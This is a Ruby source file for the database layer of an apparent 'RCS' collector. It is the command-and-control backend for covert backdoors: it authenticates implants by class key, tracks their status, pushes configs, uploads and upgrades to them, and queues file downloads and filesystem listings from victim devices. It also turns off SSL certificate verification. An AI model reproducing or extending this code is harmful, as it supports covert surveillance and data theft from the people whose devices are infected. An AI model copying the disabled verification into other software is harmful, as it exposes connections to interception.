#
#  DB layer for XML-RPC communication
#

# from RCS::Common
require 'rcs-common/trace'

# system
require 'xmlrpc/client'
require 'timeout'
require 'thread'

module RCS
module Collector

class DB_xmlrpc
  include RCS::Tracer

  # if a method does not reply in X seconds consider db down
  DB_TIMEOUT = 10

  def initialize(host)
    @host, @port = host.split(':')

    # create the xml-rpc server
    @xmlrpc = XMLRPC::Client.new(@host, '/server.php', @port, nil, nil, nil, nil, true)

    # we need to set an attribute inside the http instance variable of @server
    # we can get a reference here and manipulate it later
    @http = @xmlrpc.instance_variable_get(:@http)

    # the mutex to avoid race conditions
    @semaphore = Mutex.new

    # no SSL verify for this connection
    #TODO: XXX remove this, we have to verify the SSL
    @http.verify_mode = OpenSSL::SSL::VERIFY_NONE

    # CA certificate to check if the server ssl certificate is valid
    @http.ca_file = Config.file('DB_CERT')

    # our client certificate to send to the server
    @http.cert = OpenSSL::X509::Certificate.new(File.read(Config.file('DB_CERT')))

    trace :debug, "Using XML-RPC to communicate with #{@host}:#{@port}"
  end

  # generic method invocation
  def xmlrpc_call(*args)
    begin
      Timeout::timeout(DB_TIMEOUT) do
        return @semaphore.synchronize do
          @xmlrpc.call(*args)
        end
      end
    rescue
      # ensure the mutex is unlocked on timeout or errors
      @semaphore.unlock if @semaphore.locked?
      # propagate the exception to the upper layer
      raise
    end
  end

  # timeout exception propagator
  def propagate_error(e)
    # the db is down we have to report it to the upper layer
    # if the exception is not from xmlrpc (does not have faultCode)
    # it means that we are not able to talk to the db
    if not e.respond_to?(:faultCode) then
      trace :warn, "The DB in not responding: #{e.class} #{e.message}"
      raise
    end
  end


  # log in to the database
  # returns a boolean
  def login(user, pass)
    begin
      response = xmlrpc_call('auth.login', user, pass)
      return true
    rescue Exception => e
      
      # we can get a "method not found" error only if we are already logged in
      # in this case, we force a logout and retry the login
      if e.respond_to?(:faultCode) and e.faultCode == -32601 then  # -32601 is METHOD NOT FOUND
        trace :debug, "forcing logout and retrying..."
        logout
        return login(user, pass)
      end

      trace :error, "Error calling auth.login: #{e.class} #{e.message}"
      
      return false
    end
  end

  def logout
    begin
      response = xmlrpc_call('auth.logout')
      return true
    rescue Exception => e
      trace :error, "Error calling auth.logout: #{e.class} #{e.message}"
      return false
    end
  end

  def update_status(component, remoteip, status, message, disk, cpu, pcpu)
    begin
      xmlrpc_call('monitor.set', component, remoteip, status, message, disk, cpu, pcpu)
    rescue Exception => e
      trace :error, "Error calling monitor.set: #{e.class} #{e.message}"
      propagate_error e
    end
  end

  # per customer signature
  def backdoor_signature
    begin
      return xmlrpc_call('sign.get', "backdoor")
    rescue Exception => e
      trace :error, "Error calling sign.get: #{e.class} #{e.message}"
      propagate_error e
    end
  end

  # network signature for NC
  def network_signature
    begin
      return xmlrpc_call('sign.get', "network")
    rescue Exception => e
      trace :error, "Error calling sign.get: #{e.class} #{e.message}"
      propagate_error e
    end
  end

  # used to authenticate the backdoors
  def class_keys(build_id = '')
    begin
      list = xmlrpc_call('backdoor.getclasskey', build_id)
      # if we are are requesting a specific build_id, return only the key
      return list[0]['classkey'] if build_id.length > 0

      # otherwise return all the results by converting
      # the response into an hash indexed by 'build'
      class_keys = {}
      list.each do |elem|
        class_keys[elem['build']] = elem['classkey']
      end
      return class_keys
    rescue Exception => e
      trace :error, "Error calling backdoor.getclasskey: #{e.class} #{e.message}"
      propagate_error e
    end
  end

  # backdoor identify
  def status_of(build_id, instance_id, subtype)
    begin
      ret = xmlrpc_call('backdoor.identify', build_id, instance_id, subtype)
      bid = ret['backdoor_id']
      if ret['deleted'] == 1 then
        return DB::DELETED_BACKDOOR, bid
      end
      case ret['status']
        when 'OPEN'
          return DB::ACTIVE_BACKDOOR, bid
        when 'QUEUED'
          return DB::QUEUED_BACKDOOR, bid
        when 'CLOSED'
          return DB::CLOSED_BACKDOOR, bid
      end
    rescue Exception => e
      # 1702 is NO SUCH BACKDOOR
      if e.respond_to?(:faultCode) and e.faultCode == 1702 then
        return DB::NO_SUCH_BACKDOOR, 0
      end

      trace :error, "Error calling backdoor.identify: #{e.class} #{e.message}"
      propagate_error e

      return DB::UNKNOWN_BACKDOOR, 0
    end
  end

  # the sync date is sent to the database here
  def sync_start(bid, version, user, device, source, time)
    begin
      xmlrpc_call('backdoor.sync', bid, source, user, device, version, time)
    rescue Exception => e
      trace :error, "Error calling backdoor.sync: #{e.class} #{e.message}"
      propagate_error e
    end
  end

  # generic function to retrieve a large file from the db
  def get_file(*resource)

    # prepare the http request
    # for threading reasons we msut instantiate a new one
    http = Net::HTTP.new(@host, @port)
    http.use_ssl = true
    #TODO: XXX remove this, we have to verify the SSL
    http.verify_mode = OpenSSL::SSL::VERIFY_NONE
    http.ca_file = @http.ca_file
    http.cert = @http.cert
    http.read_timeout = 5

    # the HTTP headers for the authentication
    headers = {
      'Cookie' => @xmlrpc.cookie,
      'Content-Type' => 'application/x-www-form-urlencoded',
    }

    # prepare the post request
    poststring = ""
    resource.first.each_pair do |key, value|
      poststring += "#{key}=#{value}&"
    end

    # use the new http object (to avoid race conditions with the xmlrpc object)
    resp = http.request_post('/download.php', poststring, headers)

    return resp.body
  end

  # retrieve the new config for a backdoor (if any)
  def new_conf(bid)
    begin
      ret = xmlrpc_call('config.getnew', bid)
      cid = ret['config_id']

      return 0 if cid == 0

      # retrieve the file from the db
      config = get_file :resource => 'config', :config_id => cid

      return cid, config
    rescue Exception => e
      trace :error, "Error calling config.getnew: #{e.class} #{e.message}"
      propagate_error e
    end
  end

  def conf_sent(cid)
    begin
      xmlrpc_call('config.setsent', cid)
    rescue Exception => e
      trace :error, "Error calling config.setsent: #{e.class} #{e.message}"
      propagate_error e
    end
  end

  def new_uploads(bid)
    begin
      ret = xmlrpc_call('upload.get', bid)

      upl = {}
      # parse the results and get the contents of the uploads
      ret.each do |elem|
        upl[elem['upload_id']] = {:filename => elem['filename'],
                                  :content => get_file(:resource => 'upload', :upload_id => elem['upload_id'])}
        trace :debug, "File retrieved: [#{elem['filename']}] #{upl[elem['upload_id']][:content].length} bytes"
      end

      return upl
    rescue Exception => e
      trace :error, "Error calling upload.get: #{e.class} #{e.message}"
      propagate_error e
    end
  end

  def del_upload(id)
    begin
      xmlrpc_call('upload.del', id)
    rescue Exception => e
      trace :error, "Error calling upload.del: #{e.class} #{e.message}"
      propagate_error e
    end
  end

  def new_upgrade(bid)
    begin
      ret = xmlrpc_call('upgrade.get', bid)

      upg = {}
      # parse the results and get the contents of the uploads
      ret.each do |elem|
        upg[elem['upgrade_id']] = {:filename => elem['filename'],
                                  :content => get_file(:resource => 'upgrade', :upgrade_id => elem['upgrade_id'])}
        trace :debug, "File retrieved: [#{elem['filename']}] #{upg[elem['upgrade_id']][:content].length} bytes"
      end

      return upg
    rescue Exception => e
      trace :error, "Error calling upgrade.get: #{e.class} #{e.message}"
      propagate_error e
    end
  end

  def del_upgrade(bid)
    begin
      xmlrpc_call('upgrade.del', bid)
    rescue Exception => e
      trace :error, "Error calling upgrade.del: #{e.class} #{e.message}"
      propagate_error e
    end
  end

  # retrieve the download list from db (if any)
  def new_downloads(bid)
    begin
      ret = xmlrpc_call('download.get', bid)

      down = {}
      # parse the results
      ret.each do |elem|
        down[elem['download_id']] = elem['filename']
      end
      
      return down
    rescue Exception => e
      trace :error, "Error calling download.get: #{e.class} #{e.message}"
      propagate_error e
    end
  end

  def del_download(id)
    begin
      xmlrpc_call('download.del', id)
    rescue Exception => e
      trace :error, "Error calling download.del: #{e.class} #{e.message}"
      propagate_error e
    end
  end

  # retrieve the filesystems list from db (if any)
  def new_filesystems(bid)
    begin
      ret = xmlrpc_call('filesystem.get', bid)

      files = {}
      # parse the results
      ret.each do |elem|
        files[elem['filesystem_id']] = {:depth => elem['depth'], :path => elem['path']}
      end
      
      return files
    rescue Exception => e
      trace :error, "Error calling filesystem.get: #{e.class} #{e.message}"
      propagate_error e
    end
  end

  def del_filesystem(id)
    begin
      xmlrpc_call('filesystem.del', id)
    rescue Exception => e
      trace :error, "Error calling filesystem.del: #{e.class} #{e.message}"
      propagate_error e
    end
  end

  def get_proxies
    begin
      xmlrpc_call('proxy.get', 0)
    rescue Exception => e
      trace :error, "Error calling proxy.get: #{e.class} #{e.message}"
      propagate_error e
    end
  end

  def get_collectors
    begin
      xmlrpc_call('collector.get', 0)
    rescue Exception => e
      trace :error, "Error calling collector.get: #{e.class} #{e.message}"
      propagate_error e
    end
  end

  def proxy_set_version(id, version)
    begin
      xmlrpc_call('proxy.setversion', id, version)
    rescue Exception => e
      trace :error, "Error calling proxy.setversion: #{e.class} #{e.message}"
      propagate_error e
    end
  end

  def collector_set_version(id, version)
    begin
      xmlrpc_call('collector.setversion', id, version)
    rescue Exception => e
      trace :error, "Error calling collector.setversion: #{e.class} #{e.message}"
      propagate_error e
    end
  end

  def proxy_get_config(id)
    begin
      # retrieve the file from the db
      config = get_file :resource => 'proxy', :proxy_id => id
      # set the config as sent
      xmlrpc_call('proxy.setstatus', id, 0)
      return config
    rescue Exception => e
      trace :error, "Error calling proxy get config: #{e.class} #{e.message}"
      propagate_error e
    end
  end

  def collector_get_config(id)
    begin
      # retrieve the file from the db
      config = get_file :resource => 'collector', :collector_id => id
      # set the config as sent
      xmlrpc_call('collector.setstatus', id, 0)
      return config
    rescue Exception => e
      trace :error, "Error calling collector get config: #{e.class} #{e.message}"
      propagate_error e
    end
  end

  def proxy_add_log(id, time, type, desc)
    begin
      xmlrpc_call('proxy.addlog', id, type, time, desc)
    rescue Exception => e
      trace :error, "Error calling proxy.addlog: #{e.class} #{e.message}"
      propagate_error e
    end
  end

  def collector_add_log(id, time, type, desc)
    begin
      xmlrpc_call('collector.addlog', id, type, time, desc)
    rescue Exception => e
      trace :error, "Error calling collector.addlog: #{e.class} #{e.message}"
      propagate_error e
    end
  end

end #

end #Collector::
end #RCS::